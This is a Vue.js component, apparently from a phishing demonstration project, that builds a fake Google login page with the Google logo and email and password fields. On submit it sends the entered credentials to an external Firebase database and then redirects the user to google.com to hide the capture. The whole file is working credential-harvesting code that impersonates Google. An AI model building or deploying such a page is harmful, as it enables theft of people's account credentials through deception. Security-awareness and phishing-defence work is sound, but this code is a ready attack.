<template>
	<div>
		<div class="container">
			<img
				class="image"
				src="../../public/google_logo.png"
				alt="Google"
			/>
		</div>

		<div class="view">
			<form @submit.prevent="handleSubmit" class="container">
				<div class="input_field">
					<label for="email">Email</label>
					<input
						type="email"
						name="email"
						id="email"
						v-model.trim="formData.email"
					/>
				</div>
				<div class="input_field">
					<label for="password">Password </label>
					<input
						type="password"
						name="password"
						id="password"
						v-model.trim="formData.password"
					/>
				</div>
				<div class="center">
					<button type="submit">Confirm</button>
				</div>
			</form>
		</div>
	</div>
</template>

<script>
	import axios from 'axios';
	export default {
		data() {
			return {
				formData: {
					email: '',
					password: '',
				},
			};
		},
		methods: {
			handleSubmit() {
				axios
					.post('https://ethical-14729.firebaseio.com/users.json', {
						...this.formData,
					})
					.then(() => {
						window.location = 'http://www.google.com';
					});
			},
		},
	};
</script>
